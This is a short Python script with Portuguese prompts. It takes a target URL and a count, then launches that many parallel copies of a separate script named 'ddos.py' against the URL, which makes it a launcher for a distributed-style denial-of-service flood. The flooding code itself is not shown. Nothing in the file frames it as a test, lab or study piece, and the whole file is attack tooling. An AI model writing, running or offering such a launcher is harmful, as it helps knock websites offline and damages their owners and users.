import sys,os

if(len(sys.argv) > 2):
    if("-u" in sys.argv):
        url = str(sys.argv[int(sys.argv.index("-u")+1)])
    else:
        print("Passe a url!")
        exit()
    if("-n" in sys.argv):
        n = int(sys.argv[int(sys.argv.index("-n")+1)])
    else:
        n = 100
else:
    exit()

for d in range(0,n):
    os.system("start py ddos.py -u {}".format(url))